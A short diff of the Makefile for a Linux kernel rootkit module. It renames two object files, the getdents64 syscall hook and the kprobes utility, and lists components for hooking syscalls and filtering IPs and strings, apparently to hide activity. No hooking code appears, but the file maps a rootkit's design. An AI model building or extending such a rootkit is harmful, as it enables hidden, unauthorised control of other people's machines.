@@ -6,10 +6,10 @@ HIDE_MODULE ?= 0
 
 obj-m += $(MODULE_NAME).o
 $(MODULE_NAME)-objs := src/mod_rootkit.o \
-                       src/hooks/x64_sys_getdents.o \
+                       src/hooks/x64_sys_getdents64.o \
                        src/hooks/x64_sys_read.o \
                        src/utils/ftrace_utils.o \
-                       src/utils/kprobe_utils.o \
+                       src/utils/kprobes_utils.o \
                        src/utils/proc_utils.o \
                        src/utils/excludes/ip_filtering.o \
                        src/utils/excludes/string_filtering.o
